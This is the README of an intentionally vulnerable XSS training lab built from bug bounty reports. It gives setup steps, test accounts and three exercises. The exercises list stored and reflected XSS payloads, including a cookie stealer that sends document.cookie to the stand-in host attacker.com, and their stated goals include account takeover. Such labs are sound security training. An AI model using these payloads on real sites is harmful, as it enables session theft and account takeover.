# XSS Vulnerability Lab

A hands-on lab environment based on real bug bounty reports demonstrating three different Cross-Site Scripting (XSS) vulnerabilities.

## ⚠️ Warning

**This lab contains intentionally vulnerable code for educational purposes only. DO NOT deploy this in any production environment or expose it to the internet.**

## Installation

1. Clone the repository:
```bash
git clone https://github.com//XSS-LAB.git
cd XSS-LAB
```

2. Create a virtual environment (recommended):
```bash
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

3. Install dependencies:
```bash
pip install -r requirements.txt
```

4. Run the application:
```bash
python app.py
```

Or use the convenience script:
```bash
chmod +x run.sh
./run.sh
```

5. Access the lab in your browser:
```
http://localhost:5000
```

## Test Accounts

| Username | Password | Role |
|----------|----------|------|
| `migration_coord` | `coord123` | Migration Coordinator |
| `victim` | `victim123` | Regular User |
| `admin` | `admin123` | Administrator |

## What to Practice

### Lab 1: Stored XSS in Migration Title
- **Location**: `/migrations` page
- **Objective**: Inject XSS payload in migration title field
- **Impact**: Steal cookies and gain admin access
- **Steps**:
  1. Log in as `migration_coord` / `coord123`
  2. Create a migration with XSS payload in title: `<script>alert('XSS')</script>`
  3. Log in as `victim` and view migrations
  4. Try cookie stealer: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`

### Lab 2: Stored XSS in Profile Name
- **Location**: `/profile` page
- **Objective**: Inject XSS payload in profile name field
- **Impact**: Execute script on login, steal session cookies
- **Steps**:
  1. Log in as any user
  2. Update profile name with: `xx"><svg/onload=confirm(1)>`
  3. Log out and log back in - XSS executes
  4. Steal cookies to gain admin access

### Lab 3: Reflected XSS in URL Parameter
- **Location**: `/help` and `/Self-Signup/en_US/index.html`
- **Objective**: Inject XSS via URL parameters
- **Impact**: Execute JavaScript via crafted URLs
- **Steps**:
  1. Try search parameter: `/help?q=<script>alert('XSS')</script>`
  2. Iframe injection: `/help?help.html=javascript:confirm(1)`
  3. External URL: `/help?help.html=https://shorturl.at/w82nn`
  4. Self-signup: `/Self-Signup/en_US/index.html?url=javascript:confirm(1)`

## Learning Goals

- Understand stored vs reflected XSS
- Practice cookie theft via XSS
- Learn account takeover techniques
- Test XSS payloads in different contexts
- Understand real-world bug bounty scenarios

## Author

****

- 📷 [Instagram](https://www.instagram.com/)
- 🎓 [Bug Bounty Course](https://lureo.shop)

## License

MIT License - See [LICENSE](LICENSE) file for details.
